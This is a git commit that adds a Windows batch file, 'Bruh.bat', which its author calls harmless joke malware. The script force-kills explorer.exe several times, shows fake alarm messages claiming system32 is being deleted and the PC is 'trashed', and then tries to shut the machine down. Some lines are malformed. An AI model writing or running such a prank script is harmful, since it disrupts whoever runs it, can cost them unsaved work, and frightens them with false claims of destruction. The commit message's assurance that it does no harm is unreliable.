767e4502db32d2a37a394cf62f0a1ee4f03d2035
Kepixbro <105105160+Kepixbro@users.noreply.github.com>
2022-05-07 11:24:37 +0200

    My Own malware *joke malware*
    This doesnt do any harm this is for a joke.

---
+++ Bruh.bat
@@ -0,0 +1,10 @@
+@echo off 
+taskkill /f /im explorer.exe
+start start start start taskkill /f /im explorer.exe taskkill /f /im explorer.exe taskkill /f /im explorer.exe taskkill /f /im explorer.exe taskkill /f /im explorer.exe 
+msg * Still using, this computer? msg * msg * LOL RIP.
+msg * Ur comupter is unusable
+msg * Deleting system32 
+msg * ur pc is trashed
+msg * LOL 
+msg * Ur computer is done for.
+restart -s
